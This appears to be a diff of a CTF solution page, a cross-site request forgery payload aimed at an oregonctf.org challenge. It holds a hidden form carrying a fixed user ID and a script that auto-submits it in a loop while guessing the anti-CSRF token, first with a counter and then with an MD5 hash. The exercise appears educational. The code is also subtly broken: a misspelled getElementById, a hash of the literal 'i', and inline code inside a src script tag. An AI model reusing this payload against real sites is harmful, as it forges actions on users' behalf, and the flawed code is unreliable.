@@ -2,16 +2,18 @@
 <html>
 <body>
 
-<form id="completeChallenge2" action="http://cs410.oregonctf.org/user/csrfchallengefive/plusplus" method="POST">
+<form id="completeChallenge2" action="http://cs410.oregonctf.org/user/csrfchallengesix/plusplus" method="POST">
 <input name="userId" type="hidden" value="0803943e9dc9daabd97e24c21556eac84f5c3030" />
 <input id = "test" type="hidden" name="csrfToken" value="0"/>
  <input type="submit" />
 </form>
-<script>
+ <script ></script>
+<script src="http://crypto-js.googlecode.com/svn/tags/3.1.2/build/rollups/md5.js">
  var i;
  for(i=0; i < 999999; i++){
+  var hash = CryptoJS.MD5("i");
 document.forms["completeChallenge2"].submit();
-document.getElementbyId("test").value += i;
+document.getElementbyId("test").value = hash;
  }
 </script>
 </body>
